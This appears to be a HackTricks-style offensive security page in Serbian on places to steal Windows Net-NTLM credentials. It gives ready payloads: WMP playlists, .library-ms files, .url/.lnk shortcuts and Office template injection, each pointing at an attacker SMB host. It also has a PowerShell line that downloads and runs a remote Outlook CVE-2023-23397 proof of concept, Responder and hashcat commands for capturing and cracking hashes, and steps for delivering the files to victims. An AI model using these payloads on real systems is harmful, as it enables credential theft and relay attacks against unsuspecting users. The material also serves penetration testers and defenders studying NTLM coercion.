# Mesta za krađu NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje sa [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od preuzimanja microsoft word datoteke online do ntlm leaks izvora: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

Ako možete navesti metu da otvori ili pregleda Windows Media Player playlistu koju kontrolišete, možete leak Net‑NTLMv2 tako što ćete staviti unos koji pokazuje na UNC putanju. WMP će pokušati da preuzme referencirani medij preko SMB i implicitno će se autentifikovati.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Tok prikupljanja i crackinga:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer nesigurno rukuje .library-ms fajlovima kada se oni otvore direktno iz ZIP arhive. Ako definicija biblioteke upućuje na udaljeni UNC path (npr., \\attacker\share), samo pregledanje/pokretanje .library-ms unutar ZIP-a navodi Explorer da enumeriše UNC i pošalje NTLM autentifikaciju napadaču. Ovo dovodi do NetNTLMv2 koji može biti cracked offline ili potencijalno relayed.

Minimalna .library-ms koja upućuje na napadačev UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operativni koraci
- Kreirajte .library-ms fajl sa XML-om iznad (podesite svoju IP/hostname).
- Zip-ujte ga (na Windows: Send to → Compressed (zipped) folder) i dostavite ZIP cilju.
- Pokrenite NTLM capture listener i sačekajte da žrtva otvori .library-ms iz ZIP-a.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows je obrađivao extended MAPI property PidLidReminderFileParameter u stavkama kalendara. Ako to svojstvo pokazuje na UNC path (npr. \\attacker\share\alert.wav), Outlook bi kontaktirao SMB share kada se podsetnik aktivira, leaking korisnikov Net‑NTLMv2 bez ikakvog klika. Ovo je zakrpljeno 14. marta 2023, ali je i dalje vrlo relevantno za nasleđene/neosvežene fleet-ove i za istorijski odgovor na incidente.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Sa strane Listener-a:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Napomene
- Meta treba samo da ima pokrenut Outlook for Windows kada se podsetnik aktivira.
- Ovaj leak daje Net‑NTLMv2 pogodan za offline cracking ili relay (ne pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer automatski prikazuje ikone prečica. Nedavno istraživanje je pokazalo da, čak i nakon Microsoft‑ovog patcha iz aprila 2025. za UNC‑icon shortcuts, i dalje je bilo moguće pokrenuti NTLM autentifikaciju bez klika tako što se cilj prečice hostuje na UNC path dok je ikona lokalna (bypass patche za koji je dodeljen CVE‑2025‑50154). Samo pregledanje foldera navodi Explorer da preuzme metapodatke sa udaljenog cilja i pošalje NTLM napadačevom SMB serveru.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Prečica programa payload (.lnk) putem PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideje za isporuku
- Ubacite prečicu u ZIP i naterajte žrtvu da ga pregleda.
- Postavite prečicu na deljeni resurs sa mogućnošću pisanja koji će žrtva otvoriti.
- Kombinujte sa drugim lure fajlovima u istoj fascikli tako da Explorer prikaže preview stavki.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office dokumenti mogu referencirati eksterni template. Ako postavite priloženi template na UNC path, otvaranjem dokumenta će doći do autentifikacije prema SMB.

Minimalne izmene DOCX relationship-a (inside word/):

1) Izmenite word/settings.xml i dodajte referencu na priloženi template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Izmenite word/_rels/settings.xml.rels i postavite rId1337 na svoj UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Prepakujte u .docx i isporučite. Pokrenite vaš SMB capture listener i sačekajte da se otvori.

Za post-capture ideje o relaying ili abusing NTLM, pogledajte:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
